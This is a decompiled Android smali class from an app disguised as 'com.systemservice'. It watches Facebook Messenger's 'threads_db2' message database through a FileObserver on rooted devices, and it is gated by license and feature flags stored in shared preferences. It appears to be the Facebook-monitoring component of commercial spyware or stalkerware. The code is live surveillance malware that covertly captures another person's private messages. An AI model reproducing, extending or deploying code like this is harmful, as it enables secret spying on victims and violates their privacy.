.class public Lcom/systemservice/a/c/h/b;
.super Lcom/systemservice/a/d/a;
.source ""


# static fields
.field private static final d:[Ljava/lang/String;


# instance fields
.field private e:Z

.field private f:Ljava/lang/String;

.field private g:Lcom/systemservice/a/g/d;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, Lcom/systemservice/a/c/h/b;->d:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/k;)V
    .locals 1

    invoke-direct {p0}, Lcom/systemservice/a/d/a;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/systemservice/a/c/h/b;->e:Z

    iput-object p2, p0, Lcom/systemservice/a/d/a;->c:Ljava/lang/String;

    invoke-virtual {p0, p3}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/common/features/settingHistory/b;)V

    invoke-virtual {p0, p4}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/h/b;)V

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v0, Lcom/systemservice/a/a/i;->b:Ljava/lang/String;

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "threads_db2"

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    iput-object p2, p0, Lcom/systemservice/a/c/h/b;->f:Ljava/lang/String;

    :try_start_0
    new-instance p2, Lcom/systemservice/a/g/d;

    sget-object v0, Lcom/systemservice/a/a/i;->b:Ljava/lang/String;

    invoke-direct {p2, v0}, Lcom/systemservice/a/g/d;-><init>(Ljava/lang/String;)V

    iput-object p2, p0, Lcom/systemservice/a/c/h/b;->g:Lcom/systemservice/a/g/d;

    iget-object p2, p0, Lcom/systemservice/a/c/h/b;->g:Lcom/systemservice/a/g/d;

    invoke-virtual {p2, p1}, Lcom/systemservice/a/g/d;->a(Landroid/content/Context;)V

    iget-object p1, p0, Lcom/systemservice/a/c/h/b;->g:Lcom/systemservice/a/g/d;

    iput-object p3, p1, Lcom/systemservice/a/g/d;->c:Lcom/systemservice/common/features/settingHistory/b;

    iget-object p1, p0, Lcom/systemservice/a/c/h/b;->g:Lcom/systemservice/a/g/d;

    iput-object p4, p1, Lcom/systemservice/a/g/d;->b:Lcom/systemservice/a/h/k;

    iget-object p1, p0, Lcom/systemservice/a/c/h/b;->g:Lcom/systemservice/a/g/d;

    iget-object p2, p0, Lcom/systemservice/a/c/h/b;->f:Ljava/lang/String;

    iput-object p2, p1, Lcom/systemservice/a/g/d;->d:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ""

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "AndroidFacebookWatcher"

    invoke-static {p2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method static synthetic a(Lcom/systemservice/a/c/h/b;)Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/h/b;->f:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic b(Lcom/systemservice/a/c/h/b;)Z
    .locals 0

    iget-boolean p0, p0, Lcom/systemservice/a/c/h/b;->e:Z

    return p0
.end method


# virtual methods
.method public a(Lcom/systemservice/a/b/a;)V
    .locals 0

    return-void
.end method

.method public a(Lcom/systemservice/a/d/b;)V
    .locals 7

    const-string v0, ""

    const-string v1, "AndroidFacebookWatcher"

    invoke-super {p0, p1}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/d/b;)V

    :try_start_0
    check-cast p1, Lcom/systemservice/a/b/a;

    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    const-string v2, "app_prefs_settings"

    const/4 v3, 0x0

    invoke-virtual {p1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-virtual {p0}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v4

    invoke-virtual {v4, p1}, Lcom/systemservice/common/features/settingHistory/b;->d(Landroid/content/Context;)V

    const-string v4, "license-expired"

    invoke-interface {v2, v4, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const-string v5, "facebook_active"

    invoke-interface {v2, v5, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    const-string v6, "is_device_rooted"

    invoke-interface {v2, v6, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v6

    iput-boolean v6, p0, Lcom/systemservice/a/c/h/b;->e:Z

    const-string v6, "is_facebook_installed"

    invoke-interface {v2, v6, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v3

    if-nez v4, :cond_1

    if-eqz v3, :cond_1

    if-eqz v5, :cond_1

    iget-boolean v3, p0, Lcom/systemservice/a/c/h/b;->e:Z

    if-nez v3, :cond_0

    goto :goto_0

    :cond_0
    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lcom/systemservice/a/c/h/a;

    invoke-direct {v4, p0, v2, p1}, Lcom/systemservice/a/c/h/a;-><init>(Lcom/systemservice/a/c/h/b;Landroid/content/SharedPreferences;Landroid/content/Context;)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    invoke-static {}, Lcom/systemservice/a/g/e;->c()V

    iget-object p1, p0, Lcom/systemservice/a/c/h/b;->g:Lcom/systemservice/a/g/d;

    invoke-virtual {p1}, Landroid/os/FileObserver;->startWatching()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :catch_0
    move-exception p1

    :try_start_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :cond_1
    :goto_0
    :try_start_3
    iget-object p1, p0, Lcom/systemservice/a/c/h/b;->g:Lcom/systemservice/a/g/d;

    invoke-virtual {p1}, Landroid/os/FileObserver;->stopWatching()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    :catch_1
    move-exception p1

    :try_start_4
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :goto_1
    return-void

    :catch_2
    move-exception p1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_2
    return-void
.end method

.method public e()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/systemservice/a/c/h/b;->d:[Ljava/lang/String;

    return-object v0
.end method
